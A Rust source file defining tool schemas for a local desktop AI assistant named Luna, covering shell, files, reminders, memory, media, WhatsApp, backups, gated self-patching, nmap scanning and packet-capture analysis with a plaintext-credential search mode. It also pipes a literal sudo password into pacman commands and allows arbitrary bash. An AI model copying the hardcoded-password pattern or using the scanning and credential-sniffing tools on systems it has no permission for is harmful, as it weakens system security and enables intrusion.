//! tools/mod.rs — Tool registry
//!
//! One tool per capability, sized for a 7B model to use reliably.
//! Redundant tools (list_dir, find_binary, open) removed;
//! run_shell handles all of those.
pub mod backup;
pub mod desktop;
pub mod eyes;
pub mod filesystem;
pub mod learn;
pub mod pkgupdate;
pub mod proactive;
pub mod reminders;
pub mod safety;
pub mod select;
pub mod security;
pub mod selfpatch;
pub mod shell;
pub mod spotify;
pub mod sysmode;
pub mod todoist;
pub mod verify;
pub mod web;
pub mod whatsapp;

use crate::llm::ollama::{ToolCall, ToolDef, ToolFunction};
use anyhow::{Context, Result};
use serde_json::json;
use std::borrow::Cow;
use std::time::Instant;

pub fn tool_definitions() -> Vec<ToolDef> {
    vec![
        ToolDef {
            r#type: "function".into(),
            function: ToolFunction {
                name: "run_shell".into(),
                description: "Run ANY bash command. Use for: launching apps (append &), \
                              installing packages, file operations, system queries, anything. \
                              For pacman installs use: echo '1' | sudo pacman -S <pkg> --noconfirm \
                              For paru/yay installs use: paru -S <pkg> --noconfirm \
                              ALWAYS use this tool — never describe commands in text.".into(),
                parameters: json!({
                    "type": "object",
                    "properties": {
                        "command": {
                            "type": "string",
                            "description": "Bash command to run. Examples: 'kitty &', 'echo 1 | sudo pacman -S htop --noconfirm', 'ls ~'"
                        }
                    },
                    "required": ["command"]
                }),
            },
        },
        ToolDef {
            r#type: "function".into(),
            function: ToolFunction {
                name: "edit_file".into(),
                description: "Edit a code or text file programmatically by replacing target text ('old_str') with new text ('new_str'), or by writing new content. Pass open_in_gui=true to launch GUI editor.".into(),
                parameters: json!({
                    "type": "object",
                    "properties": {
                        "path": {
                            "type": "string",
                            "description": "Path to the file (~ is expanded automatically)"
                        },
                        "old_str": {
                            "type": "string",
                            "description": "Existing text or code snippet in the file to replace"
                        },
                        "new_str": {
                            "type": "string",
                            "description": "New replacement text or code snippet"
                        },
                        "content": {
                            "type": "string",
                            "description": "Full new content for the file if replacing completely"
                        },
                        "open_in_gui": {
                            "type": "boolean",
                            "description": "If true, open the file in zeditor GUI for the user"
                        }
                    },
                    "required": ["path"]
                }),
            },
        },
        ToolDef {
            r#type: "function".into(),
            function: ToolFunction {
                name: "web_search".into(),
                description: "Search the internet for current information, news,                               package names, how-to guides, or anything Luna doesn't know.                               Returns a text summary of top results.".into(),
                parameters: json!({
                    "type": "object",
                    "properties": {
                        "query": {
                            "type": "string",
                            "description": "Search query"
                        }
                    },
                    "required": ["query"]
                }),
            },
        },
        ToolDef {
            r#type: "function".into(),
            function: ToolFunction {
                name: "nmap_scan".into(),
                description: "Run an nmap scan against a target (IP, hostname, or CIDR range). \
                              Use for network reconnaissance, CTF challenges, or auditing your \
                              own network. Only scan targets you own or have permission to test.".into(),
                parameters: json!({
                    "type": "object",
                    "properties": {
                        "target": {
                            "type": "string",
                            "description": "IP, hostname, or CIDR range, e.g. '192.168.1.1' or '10.0.0.0/24'"
                        },
                        "scan_type": {
                            "type": "string",
                            "enum": ["quick", "full", "ports", "os", "udp"],
                            "description": "quick=fast top ports, full=version+script detection, \
                                           ports=all 65535 ports, os=OS detection (needs sudo), \
                                           udp=top 20 UDP ports"
                        }
                    },
                    "required": ["target", "scan_type"]
                }),
            },
        },
        ToolDef {
            r#type: "function".into(),
            function: ToolFunction {
                name: "analyze_pcap".into(),
                description: "Analyze a packet capture (.pcap/.pcapng) file using tshark. \
                              Use for CTF forensics challenges or investigating captured traffic.".into(),
                parameters: json!({
                    "type": "object",
                    "properties": {
                        "path": { "type": "string", "description": "Path to the pcap file" },
                        "mode": {
                            "type": "string",
                            "enum": ["summary", "talkers", "protocols", "http", "dns", "creds"],
                            "description": "summary=file info, talkers=top IP conversations, \
                                           protocols=protocol breakdown, http=HTTP requests, \
                                           dns=DNS queries, creds=look for plaintext credentials"
                        }
                    },
                    "required": ["path", "mode"]
                }),
            },
        },
        ToolDef {
            r#type: "function".into(),
            function: ToolFunction {
                name: "decode_payload".into(),
                description: "Decode an encoded string — common in CTF challenges. \
                              Supports base64, hex, URL encoding, ROT13, and raw binary.".into(),
                parameters: json!({
                    "type": "object",
                    "properties": {
                        "data": { "type": "string", "description": "The encoded string to decode" },
                        "encoding": {
                            "type": "string",
                            "enum": ["auto", "base64", "hex", "url", "rot13", "binary"],
                            "description": "auto tries base64 then hex; specify if known"
                        }
                    },
                    "required": ["data", "encoding"]
                }),
            },
        },
        ToolDef {
            r#type: "function".into(),
            function: ToolFunction {
                name: "hash_file".into(),
                description: "Compute a cryptographic hash of a file (md5, sha1, sha256, sha512, or all).".into(),
                parameters: json!({
                    "type": "object",
                    "properties": {
                        "path": { "type": "string" },
                        "algo": {
                            "type": "string",
                            "enum": ["md5", "sha1", "sha256", "sha512", "all"]
                        }
                    },
                    "required": ["path", "algo"]
                }),
            },
        },
        ToolDef {
            r#type: "function".into(),
            function: ToolFunction {
                name: "dns_lookup".into(),
                description: "Look up DNS records, do a reverse lookup, or query whois for a domain/IP.".into(),
                parameters: json!({
                    "type": "object",
                    "properties": {
                        "target": { "type": "string", "description": "Domain or IP" },
                        "mode": {
                            "type": "string",
                            "enum": ["dns", "reverse", "whois", "mx"]
                        }
                    },
                    "required": ["target", "mode"]
                }),
            },
        },
        ToolDef {
            r#type: "function".into(),
            function: ToolFunction {
                name: "read_file".into(),
                description: "Read and return the full contents of a file.".into(),
                parameters: json!({
                    "type": "object",
                    "properties": {
                        "path": {
                            "type": "string",
                            "description": "Path to the file"
                        }
                    },
                    "required": ["path"]
                }),
            },
        },
        ToolDef {
            r#type: "function".into(),
            function: ToolFunction {
                name: "write_file".into(),
                description: "Write code or content to a file, creating the file and any parent directories if needed.".into(),
                parameters: json!({
                    "type": "object",
                    "properties": {
                        "path": {
                            "type": "string",
                            "description": "Path to the file (~ is expanded automatically)"
                        },
                        "content": {
                            "type": "string",
                            "description": "The exact content or code to write into the file"
                        }
                    },
                    "required": ["path", "content"]
                }),
            },
        },
        ToolDef {
            r#type: "function".into(),
            function: ToolFunction {
                name: "notify".into(),
                description: "Send a desktop notification.".into(),
                parameters: json!({
                    "type": "object",
                    "properties": {
                        "title": { "type": "string" },
                        "body": { "type": "string" }
                    },
                    "required": ["title", "body"]
                }),
            },
        },
        ToolDef {
            r#type: "function".into(),
            function: ToolFunction {
                name: "process_stats".into(),
                description: "Show what Luna has learned about process usage on this machine. \
                              Lists each tracked process with how many of the last 14 days it ran, \
                              its idle status, and whether auto-kill is allowed for it.".into(),
                parameters: json!({
                    "type": "object",
                    "properties": {},
                    "required": []
                }),
            },
        },
        ToolDef {
            r#type: "function".into(),
            function: ToolFunction {
                name: "allow_autokill".into(),
                description: "Allow the daemon to automatically end a named process after it \
                              has been idle ~30 minutes. Only use when the user explicitly asks \
                              (e.g. 'allow auto-kill steam').".into(),
                parameters: json!({
                    "type": "object",
                    "properties": {
                        "name": { "type": "string", "description": "Process name from /proc, e.g. 'steam'" }
                    },
                    "required": ["name"]
                }),
            },
        },
        ToolDef {
            r#type: "function".into(),
            function: ToolFunction {
                name: "deny_autokill".into(),
                description: "Revoke auto-kill permission for a named process (removes it from \
                              the allowlist) AND teach Luna it's important: it will never be \
                              auto-killed or kill-suggested again. Use when the user says \
                              something like 'never kill steam' or 'deny auto-kill steam'.".into(),
                parameters: json!({
                    "type": "object",
                    "properties": {
                        "name": { "type": "string" }
                    },
                    "required": ["name"]
                }),
            },
        },
        ToolDef {
            r#type: "function".into(),
            function: ToolFunction {
                name: "set_reminder".into(),
                description: "Schedule a reminder that fires as a desktop notification even if \
                              Luna chat is closed. Give EITHER minutes-from-now OR a time of day."
                    .into(),
                parameters: json!({
                    "type": "object",
                    "properties": {
                        "minutes": { "type": "integer", "description": "Fire this many minutes from now (use this for 'in X minutes')" },
                        "at_time": { "type": "string", "description": "Fire at HH:MM local time, 24h — e.g. '18:30'. Next occurrence." },
                        "text": { "type": "string", "description": "What to remind about" }
                    },
                    "required": ["text"]
                }),
            },
        },
        ToolDef {
            r#type: "function".into(),
            function: ToolFunction {
                name: "list_reminders".into(),
                description: "Show all pending reminders.".into(),
                parameters: json!({ "type": "object", "properties": {}, "required": [] }),
            },
        },
        ToolDef {
            r#type: "function".into(),
            function: ToolFunction {
                name: "cancel_reminder".into(),
                description: "Cancel a pending reminder by its numeric id (from list_reminders)."
                    .into(),
                parameters: json!({
                    "type": "object",
                    "properties": {
                        "id": { "type": "integer" }
                    },
                    "required": ["id"]
                }),
            },
        },
        ToolDef {
            r#type: "function".into(),
            function: ToolFunction {
                name: "memory_report".into(),
                description: "Summarize what Luna has permanently learned about the user: shell \
                              workflow facts, system index, and memory stats. Use for 'what do \
                              you know about me / what have you learned'. ALWAYS relay the \
                              returned facts to the user as your answer — never reply with a \
                              menu of options instead.".into(),
                parameters: json!({ "type": "object", "properties": {}, "required": [] }),
            },
        },
        ToolDef {
            r#type: "function".into(),
            function: ToolFunction {
                name: "find_file".into(),
                description: "Find a file by name anywhere on the system. Returns full path.".into(),
                parameters: json!({
                    "type": "object",
                    "properties": {
                        "name": {
                            "type": "string",
                            "description": "Filename to search for e.g. 'luna.toml'"
                        },
                        "search_path": {
                            "type": "string",
                            "description": "Where to search, defaults to home dir"
                        }
                    },
                    "required": ["name"]
                }),
            },
        },
        ToolDef {
            r#type: "function".into(),
            function: ToolFunction {
                name: "system_info".into(),
                description: "Get system info: battery, cpu, ram, temp, disk, uptime, or all.".into(),
                parameters: json!({
                    "type": "object",
                    "properties": {
                        "query": {
                            "type": "string",
                            "enum": ["battery", "cpu", "ram", "temp", "disk", "uptime", "all"]
                        }
                    },
                    "required": ["query"]
                }),
            },
        },
        ToolDef {
            r#type: "function".into(),
            function: ToolFunction {
                name: "clipboard".into(),
                description: "Read from or write to the Wayland clipboard.".into(),
                parameters: json!({
                    "type": "object",
                    "properties": {
                        "action": {
                            "type": "string",
                            "enum": ["read", "write"]
                        },
                        "content": {
                            "type": "string",
                            "description": "Content to write (write action only)"
                        }
                    },
                    "required": ["action"]
                }),
            },
        },
        ToolDef {
            r#type: "function".into(),
            function: ToolFunction {
                name: "fetch_page".into(),
                description: "Fetch a webpage and return its text. Use for docs, wiki, current info.".into(),
                parameters: json!({
                    "type": "object",
                    "properties": {
                        "url": { "type": "string" }
                    },
                    "required": ["url"]
                }),
            },
        },
        ToolDef {
            r#type: "function".into(),
            function: ToolFunction {
                name: "remember".into(),
                description: "Save a fact to permanent memory forever. Call proactively when \
                              learning important things about the user, their setup, or preferences.".into(),
                parameters: json!({
                    "type": "object",
                    "properties": {
                        "fact": { "type": "string" },
                        "category": {
                            "type": "string",
                            "enum": ["user", "system", "preference", "general"]
                        }
                    },
                    "required": ["fact", "category"]
                }),
            },
        },
        ToolDef {
            r#type: "function".into(),
            function: ToolFunction {
                name: "forget".into(),
                description: "Remove facts from permanent memory by keyword.".into(),
                parameters: json!({
                    "type": "object",
                    "properties": {
                        "keyword": { "type": "string" }
                    },
                    "required": ["keyword"]
                }),
            },
        },
        ToolDef {
            r#type: "function".into(),
            function: ToolFunction {
                name: "list_memories".into(),
                description: "List everything in permanent memory.".into(),
                parameters: json!({
                    "type": "object",
                    "properties": {},
                    "required": []
                }),
            },
        },
        ToolDef {
            r#type: "function".into(),
            function: ToolFunction {
                name: "create_skill".into(),
                description: "Save a reusable procedure as a skill (learned from experience). \
                              Call when a conversation shows a repeatable multi-step task, or to \
                              UPDATE an existing skill under the same name when it was wrong or \
                              outdated. name = short kebab-case (e.g. 'arch-package-rebuild'), \
                              description = one line, procedure = step-by-step instructions. \
                              Skills are listed by list_skills, loaded by use_skill, and recalled \
                              automatically whenever relevant.".into(),
                parameters: json!({
                    "type": "object",
                    "properties": {
                        "name": { "type": "string", "description": "Skill name (kebab-case)" },
                        "description": { "type": "string", "description": "One-line summary" },
                        "procedure": { "type": "string", "description": "Step-by-step procedure" }
                    },
                    "required": ["name", "procedure"]
                }),
            },
        },
        ToolDef {
            r#type: "function".into(),
            function: ToolFunction {
                name: "use_skill".into(),
                description: "Load a saved skill's full procedure by name so you can apply it. \
                              Use when a saved skill is relevant to the user's request. If the \
                              skill turns out wrong or out of date, re-save the corrected \
                              version with create_skill (same name) to improve it.".into(),
                parameters: json!({
                    "type": "object",
                    "properties": {
                        "name": { "type": "string", "description": "Skill name to load" }
                    },
                    "required": ["name"]
                }),
            },
        },
        ToolDef {
            r#type: "function".into(),
            function: ToolFunction {
                name: "list_skills".into(),
                description: "List every skill Luna has saved, with descriptions and use counts.".into(),
                parameters: json!({ "type": "object", "properties": {}, "required": [] }),
            },
        },
        ToolDef {
            r#type: "function".into(),
            function: ToolFunction {
                name: "forget_skill".into(),
                description: "Delete a saved skill by name.".into(),
                parameters: json!({
                    "type": "object",
                    "properties": {
                        "name": { "type": "string" }
                    },
                    "required": ["name"]
                }),
            },
        },
        ToolDef {
            r#type: "function".into(),
            function: ToolFunction {
                name: "search_history".into(),
                description: "Search everything Luna remembers from PAST conversations: session \
                              titles/summaries and raw turn-by-turn text. Use for 'what did we \
                              talk about last time', 'when did I ask about X', or recalling \
                              previously-discussed details. Give a topic, task name, or phrase.".into(),
                parameters: json!({
                    "type": "object",
                    "properties": {
                        "query": { "type": "string", "description": "Topic, task, or phrase to find" }
                    },
                    "required": ["query"]
                }),
            },
        },

       ToolDef {
           r#type: "function".into(),
           function: ToolFunction {
               name: "todoist_list".into(),
               description: "List active tasks from the user's Todoist app. Use when asked \
                             about tasks, todos, or what's on their schedule.".into(),
               parameters: json!({
                   "type": "object",
                   "properties": {
                       "filter": {
                           "type": "string",
                           "description": "Optional Todoist filter query, e.g. 'today', 'overdue', \
                                          'p1' for priority 1. Leave empty for all active tasks."
                       }
                   },
                   "required": []
               }),
           },
       },
       ToolDef {
           r#type: "function".into(),
           function: ToolFunction {
               name: "todoist_add".into(),
               description: "Add a new task to the user's Todoist app.".into(),
               parameters: json!({
                   "type": "object",
                   "properties": {
                       "content": {
                           "type": "string",
                           "description": "The task text"
                       },
                       "due": {
                           "type": "string",
                           "description": "Optional due date in natural language, e.g. 'tomorrow', 'next monday', 'jun 25'"
                       }
                   },
                   "required": ["content"]
               }),
           },
       },
       ToolDef {
           r#type: "function".into(),
           function: ToolFunction {
               name: "todoist_complete".into(),
               description: "Mark a Todoist task as complete by matching its text.".into(),
               parameters: json!({
                   "type": "object",
                   "properties": {
                       "task": {
                           "type": "string",
                           "description": "Text to match against task content, e.g. 'buy milk'"
                       }
                   },
                   "required": ["task"]
               }),
           },
       },

        ToolDef {
            r#type: "function".into(),
            function: ToolFunction {
                name: "index_system".into(),
                description: "Learn the user's system deeply. Scans home directory projects/scripts/configs/rust/python \
                              into permanent memory AND analyzes the full fish history to learn the top commands, \
                              most-visited directories, most-referenced file paths (editors/openers/installers), \
                              shell habits and packages. Use for 'learn about my system', 'know everything on \
                              my machine', 'study my workflow', and all general system orientation requests. \
                              The user can say 'learn about my system' to trigger this on demand.".into(),
                parameters: json!({
                    "type": "object",
                    "properties": {
                        "scope": {
                            "type": "string",
                            "enum": ["quick", "full"]
                        }
                    },
                    "required": ["scope"]
                }),
            },
        },

        ToolDef {
            r#type: "function".into(),
            function: ToolFunction {
                name: "learn_topic".into(),
                description: "Search the web AND fetch the most relevant page in one step.                               Use this instead of calling web_search and fetch_page separately —                               it's more reliable. After it returns, call `remember` to save                               anything worth keeping permanently.".into(),
                parameters: json!({
                    "type": "object",
                    "properties": {
                        "topic": {
                            "type": "string",
                            "description": "What to learn about, e.g. 'Nothing Phone 3 specs'"
                        }
                    },
                    "required": ["topic"]
                }),
            },
        },
        ToolDef {
            r#type: "function".into(),
            function: ToolFunction {
                name: "set_debug".into(),
                description: "Toggle Luna's debug logging on or off. Writes to the config file — \
                             Luna must be restarted for the change to take effect.  Accepts \
                             'on', 'off', 'debug', or 'info'.".into(),
                parameters: json!({
                    "type": "object",
                    "properties": {
                        "level": {
                            "type": "string",
                            "enum": ["on", "off", "debug", "info"],
                            "description": "'on'/'debug' enables verbose logging; 'off'/'info' disables it"
                        }
                    },
                    "required": ["level"]
                }),
            },
        },
        ToolDef {
            r#type: "function".into(),
            function: ToolFunction {
                name: "spotify".into(),
                description: "Control the user's Spotify account via the Spotify Web API: play their \
                              Liked Songs, playlists, artists, albums, search tracks, and transport \
                              control. The user's account is ALREADY authorized — do NOT run \
                              `luna --spotify-auth` or invent luna flags (there is no \
                              --spotify-username command). Use for 'play my liked songs', 'shuffle my \
                              liked songs', 'play my <playlist>', 'play <song name>', 'next track', \
                              'what's playing on spotify', and questions like 'what is my spotify \
                              username/account name' (action 'me'), 'how many playlists do i have' \
                              / 'list my playlists' (action 'playlists'). If a call returns an \
                              authorization error, tell the user to run `luna --spotify-auth`.".into(),
                parameters: json!({
                    "type": "object",
                    "properties": {
                        "action": {
                            "type": "string",
                            "enum": ["now", "pause", "resume", "next", "previous", "shuffle",
                                     "play_liked", "search", "play_track", "play_playlist",
                                     "play_artist", "play_album", "devices", "me", "playlists"],
                            "description": "What to do: now=what's playing, pause/resume/next/previous=transport, \
                                           shuffle (set 'on' true/false), play_liked=play the user's Liked Songs \
                                           (set 'shuffle' true to shuffle), search=find tracks, \
                                           play_track/play_playlist/play_artist/play_album=play by name \
                                           (name goes in 'query' or 'playlist'), devices=list available devices, \
                                           me=the account's username/display name/email/plan, \
                                           playlists=list the user's playlists with track counts"
                        },
                        "query": {
                            "type": "string",
                            "description": "Search text for search/play_track/play_artist/play_album (e.g. 'bohemian rhapsody')"
                        },
                        "playlist": {
                            "type": "string",
                            "description": "Playlist name for play_playlist (matched by keyword, e.g. 'gym')"
                        },
                        "on": {
                            "type": "boolean",
                            "description": "For shuffle: true = shuffle on, false = off"
                        },
                        "shuffle": {
                            "type": "boolean",
                            "description": "For play_liked: true to shuffle your Liked Songs"
                        }
                    },
                    "required": ["action"]
                }),
            },
        },
        ToolDef {
            r#type: "function".into(),
            function: ToolFunction {
                name: "media_info".into(),
                description: "Get what's currently playing on the system (Spotify, MPV, \
                             browser, etc.) via D-Bus MPRIS. Returns song title, artist, \
                             album, and playback status. Use for 'what song is playing' \
                             or 'what am I listening to'. For Spotify-specific control \
                             use the 'spotify' tool instead.".into(),
                parameters: json!({
                    "type": "object",
                    "properties": {},
                    "required": []
                }),
            },
        },

        ToolDef {
            r#type: "function".into(),
            function: ToolFunction {
                name: "run_safety_check".into(),
                description: "Run or report on the system safety check. Sections: system update \
                              (pacman -Syu), ClamAV antivirus, rkhunter rootkit check, UFW firewall, \
                              Lynis audit, monthly AIDE integrity, and home-directory backup. \
                              Use for 'run a security check', 'is my system secure', 'run the weekly \
                              safety scan', 'how did the last safety check go'. It can take up to an \
                              hour (or more for the monthly full home scan). An 'attention needed' \
                              result means review the listed problems. Do NOT script it by hand with \
                              run_shell — use this tool.".into(),
                parameters: json!({
                    "type": "object",
                    "properties": {
                        "action": {
                            "type": "string",
                            "enum": ["run", "status"],
                            "description": "run = execute the full check now (status then depends on what it found), \
                                           status = report how the last check went without starting a new one"
                        },
                        "mode": {
                            "type": "string",
                            "enum": ["light", "full"],
                            "description": "light (default) = quick scan of hot dirs + weekly checks; \
                                           full = full-home ClamAV scan (slow)"
                        }
                    },
                    "required": ["action"]
                }),
            },
        },

        ToolDef {
            r#type: "function".into(),
            function: ToolFunction {
                name: "backup".into(),
                description: "Back up the user's home directory to the external drive /dev/sda1 at \
                              /mnt/backup/arch-backup/ (incremental rsync snapshots). Use for \
                              'back up my files', 'backup', 'do a backup'. Or get a status report \
                              with action=status: whether the drive is connected/mounted, last \
                              snapshot, and disk usage. The drive must be plugged in for the backup \
                              to run; if it isn't, say so and ask the user to connect it.".into(),
                parameters: json!({
                    "type": "object",
                    "properties": {
                        "action": {
                            "type": "string",
                            "enum": ["run", "status"],
                            "description": "run = perform the backup now; status = report drive + last snapshot state"
                        }
                    },
                    "required": ["action"]
                }),
            },
        },

        ToolDef {
            r#type: "function".into(),
            function: ToolFunction {
                name: "self_patch".into(),
                description: "Propose and install changes to your OWN source code, behind a \
                              test gate and human approval. The ONLY sanctioned way to modify \
                              yourself — never use write_file or run_shell to edit your own \
                              source, that skips the gate. MANDATORY ORDER: (1) action=files to \
                              see which files really exist — never guess a path; (2) \
                              action=read to get the file's NUMBERED current text — you may not \
                              propose an edit to a file you have not read this way; (3) \
                              action=propose with line_edits:[{\"at_line\":<line number from the \
                              read output>,\"replace_with\":<the new line>}] — PREFER THIS. \
                              Referencing a line NUMBER is far more reliable than copying text, \
                              because copying text back verbatim is where you go wrong: you retype \
                              it, drop indentation, or turn a two-character escape like backslash-n \
                              into a real newline. To APPEND to a file, use the LAST line number + \
                              1. (4) action=validate (runs the full cargo test suite against a \
                              scratch copy; your real tree is never modified); (5) action=apply — \
                              ONLY after validation passed AND the user approved. Use \
                              edits:[{find,replace}] only when a line number cannot express the \
                              change; each 'find' must appear EXACTLY ONCE. Never use \"content\" \
                              (whole file): you cannot reproduce a whole source file reliably. \
                              Also: review, status, rollback, discard. Your constitution, model \
                              routing, and safety tools are protected. A change only takes effect \
                              after a rebuild + daemon restart, so ALWAYS say so.".into(),
                parameters: json!({
                    "type": "object",
                    "properties": {
                        "action": {
                            "type": "string",
                            "enum": ["files", "read", "propose", "validate", "review", "status", "apply", "rollback", "discard"],
                            "description": "files = list the real source files (do this first, never \
                                           guess a path); read = show a file's exact current text (REQUIRED \
                                           before proposing an edit to it); propose = stage edits + show \
                                           diff (nothing applied); validate = run cargo test on a scratch \
                                           copy; apply = install a validated change (needs user approval); \
                                           review = show the staged diff; status = current proposal state; \
                                           rollback = revert the last applied change; discard = drop proposal"
                        },
                        "file": {
                            "type": "string",
                            "description": "For action=read: the file to read, e.g. src/main.rs"
                        },
                        "filter": {
                            "type": "string",
                            "description": "For action=files: optional case-insensitive substring to narrow the \
                                           list (e.g. \"session\", \"patch\", \"log\"). Use it when you know \
                                           roughly which file you want — a short list is much easier to act on \
                                           than the full set"
                        },
                        "changes": {
                            "type": "array",
                            "description": "For action=propose: the files to change. PREFER 'line_edits' \
                                           (by line number) over 'edits' (exact text) — copying text back \
                                           verbatim is the single most error-prone thing you can do, and \
                                           line numbers you already saw in the read output are exact.",
                            "items": {
                                "type": "object",
                                "properties": {
                                    "file": { "type": "string", "description": "path relative to the source root, e.g. src/tools/eyes.rs" },
                                    "line_edits": {
                                        "type": "array",
                                        "description": "Replace a whole line by its number. RECOMMENDED. 'at_line' \
                                                       is 1-based and must be a line number shown in the read output. \
                                                       To APPEND to the end of the file, use the LAST line number + 1. \
                                                       'replace_with' is the complete new line(s) — include the original \
                                                       indentation.",
                                        "items": {
                                            "type": "object",
                                            "properties": {
                                                "at_line": { "type": "integer", "description": "1-based line number from the read output; last_line+1 appends" },
                                                "replace_with": { "type": "string", "description": "the full replacement text for that line" }
                                            },
                                            "required": ["at_line", "replace_with"]
                                        }
                                    },
                                    "edits": {
                                        "type": "array",
                                        "description": "Targeted replacements by exact text. Use only when a line \
                                                       number cannot express the change. Each 'find' must appear \
                                                       EXACTLY ONCE in the file.",
                                        "items": {
                                            "type": "object",
                                            "properties": {
                                                "find": { "type": "string", "description": "the exact current text to replace, copied verbatim from the file" },
                                                "replace": { "type": "string", "description": "the new text" }
                                            },
                                            "required": ["find", "replace"]
                                        }
                                    },
                                    "content": { "type": "string", "description": "full file content — only for small files" }
                                },
                                "required": ["file"]
                            }
                        },
                        "reason": {
                            "type": "string",
                            "description": "For action=propose: one line on why this change is needed."
                        }
                    },
                    "required": ["action"]
                }),
            },
        },

        ToolDef {
            r#type: "function".into(),
            function: ToolFunction {
                name: "system_update".into(),
                description: "Guarded Arch package updates. action=check (default) lists pending \
                              updates WITHOUT changing anything (uses checkupdates against a throwaway \
                              temp DB) and classifies each as routine or breaking (major version bump). \
                              action=apply performs a FULL sync upgrade (yay/pacman -Syu, AUR rebuilt) \
                              but ONLY if the human has opened the gate by setting [updates] \
                              allow_apply = true in ~/.config/luna/luna.toml. That gate is a human \
                              decision: you cannot open it, and there is no argument that will. If \
                              apply refuses, tell the user exactly what to change and stop — do NOT \
                              retry, do NOT try to install anything yourself, and do NOT run a bare \
                              'pacman -Syu' via run_shell (that is a partial upgrade and can break \
                              AUR packages). Use for 'are there updates', 'update my system', \
                              'check for pacman updates'.".into(),
                parameters: json!({
                    "type": "object",
                    "properties": {
                        "action": {
                            "type": "string",
                            "enum": ["check", "apply"],
                            "description": "check (default) = list + classify pending updates, change nothing; \
                                           apply = attempt the full-sync upgrade (will refuse unless the \
                                           human has opened [updates] allow_apply in luna.toml)"
                        }
                    },
                    "required": ["action"]
                }),
            },
        },

        ToolDef {
            r#type: "function".into(),
            function: ToolFunction {
                name: "sysmode".into(),
                description: "Luna's interface to the 'sysmode' hardening-profile switcher \
                              (normally installed at /usr/local/bin/sysmode). Actions: \
                              action=status reports the current security profile and firewall/\
                              kernel state (works without root); action=check (or health) runs \
                              a full self-test of the whole setup — recon-deceiver honeypot, IDS \
                              log analyst, Cowrie SSH honeypot, tcpdump MAC scanner, decoy wifi, \
                              dnscrypt-proxy, auditd, sshd state, decoy listening ports, and \
                              log freshness — so you can say 'is the honeypot working?' or 'test \
                              if everything is working'; action=switch with 'mode' in \
                              {secure, cyber, stealth, lockdown} to change the profile — 'stealth' \
                              accepts optional 'hotspot' true/false to broadcast a decoy WiFi AP \
                              (requires [agent] sudo_password); action=reapply re-forces the \
                              current profile (root); action=logs pulls honeypot/IDS attack logs \
                              (works without root). If the tool is not installed, say so plainly \
                              and tell the user to install sysmode or set [sysmode] bin.".into(),
                parameters: json!({
                    "type": "object",
                    "properties": {
                        "action": {
                            "type": "string",
                            "enum": ["status", "check", "switch", "reapply", "logs"],
                            "description": "what to do with sysmode"
                        },
                        "mode": {
                            "type": "string",
                            "enum": ["secure", "cyber", "stealth", "lockdown"],
                            "description": "profile to switch to (only for action=switch)"
                        },
                        "hotspot": {
                            "type": "boolean",
                            "description": "stealth only: true to broadcast a decoy WiFi AP matching the spoofed hostname, false to skip"
                        }
                    },
                    "required": ["action"]
                }),
            },
        },

        ToolDef {
            r#type: "function".into(),
            function: ToolFunction {
                name: "browser_do".into(),
                description: "Make Luna actually use a real web browser. Spins up the local \
                              Project-Vision browser-automation pipeline (a VLM that looks at the \
                              page and decides what to click/type where, executing inside a \
                              visible Chromium window with its own saved profile). Good for \
                              goals like 'open amazon and add the first PS4 controller to the \
                              cart', 'search for ryzen 7 on amazon.com', or 'fill this form \
                              https://...'. Give ONE clear natural-language task. It blocks \
                              until the task finishes or its timeout passes. Use this instead of \
                              just searching when the user explicitly wants something DONE in a \
                              browser. It cannot login for you or read captchas; if the site \
                              needs a login the browser window is visible so the user can \
                              complete it.".into(),
                parameters: json!({
                    "type": "object",
                    "properties": {
                        "task": {
                            "type": "string",
                            "description": "the goal to accomplish in the browser, as a sentence (e.g. 'search for ps4 on amazon.com' or 'add the first result to cart')"
                        }
                    },
                    "required": ["task"]
                }),
            },
        },

        ToolDef {
            r#type: "function".into(),
            function: ToolFunction {
                name: "desktop_do".into(),
                description: "Control the user's WHOLE desktop — any application, not just a \
                              browser. Luna looks at a full-screen screenshot (grim), asks the \
                              local Project-Vision VLM what to do next, then drives the mouse \
                              and keyboard via ydotool (click, type, press keys, scroll) and \
                              launches apps by name (firefox, code, spotify, terminal, files, \
                              etc.). It keeps looking/acting until the task is done or the \
                              step cap hits. Use for desktop tasks the browser can't do, like \
                              'open firefox and search my history', 'open the terminal and run \
                              htop', 'open spotify and play the daily mix', 'move this window', \
                              or anything on the desktop itself. Requires the Wayland session \
                              (grim + ydotoold) and the local VLM server. Give ONE clear \
                              sentence; it blocks until finished or the timeout passes. It \
                              cannot login for you or solve captchas.".into(),
                parameters: json!({
                    "type": "object",
                    "properties": {
                        "task": {
                            "type": "string",
                            "description": "the goal to accomplish on the desktop, as one sentence"
                        }
                    },
                    "required": ["task"]
                }),
            },
        },

        ToolDef {
            r#type: "function".into(),
            function: ToolFunction {
                name: "see".into(),
                description: "Look at the screen and describe what is there using a local \
                              vision model. target='screen' captures the whole desktop with \
                              grim; target='browser' captures the automation Chromium's \
                              current page. Returns a plain-language description (visible \
                              text, windows, page content). Use when the user asks what is \
                              on the screen, to check what a web page actually looks like, \
                              or to read visible text off the display. Loads a small vision \
                              model on demand — planning pauses briefly while it runs.".into(),
                parameters: json!({
                    "type": "object",
                    "properties": {
                        "target": {
                            "type": "string",
                            "enum": ["screen", "browser"],
                            "description": "'screen' = whole desktop, 'browser' = the browser page"
                        }
                    },
                    "required": ["target"]
                }),
            },
        },

        ToolDef {
            r#type: "function".into(),
            function: ToolFunction {
                name: "whatsapp_send".into(),
                description: "Interact with the user's own WhatsApp via the local bridge (linked \
                              once via 'luna --whatsapp-link'). SEND-ONLY: it cannot read incoming \
                              messages, chats, or unread counts — say so plainly if asked. \
                              Actions: action=send with 'to' (full number digits-only like \
                              15551234567, OR 'myself'/'me' for the user's own number, OR a \
                              contact name like 'mom' — resolved from WhatsApp contacts) and \
                              'text' (the message body); action=lookup with 'to' as a name to \
                              report that contact's number WITHOUT sending; action=contacts to \
                              list the whole indexed contact book as names with their numbers \
                              (with an optional 'q' to filter by a name fragment, and 'show_all' \
                              to return the complete list instead of a preview) so messages \
                              can be addressed by name; action=frequent to list the contacts \
                              the user texts MOST — names with how many days ago each was last \
                              active (default window ~20 days) — prefer these when a name is \
                              ambiguous; action=status reports whether the bridge \
                              is up/linked and the user's own number. RECENCY RULE: when a \
                              contact name is ambiguous (e.g. two people called 'Vani'), ALWAYS \
                              prefer the most recently active match — the bridge already ranks \
                              them most-recent-first — and if the resolved contact hasn't been \
                              texted in 20+ days, mention that so the user can correct you; \
                              prefer frequent contacts over stale ones unless the user is \
                              explicit. When a number appears in \
                              conversation, prefer the contact's NAME; only give the bare number \
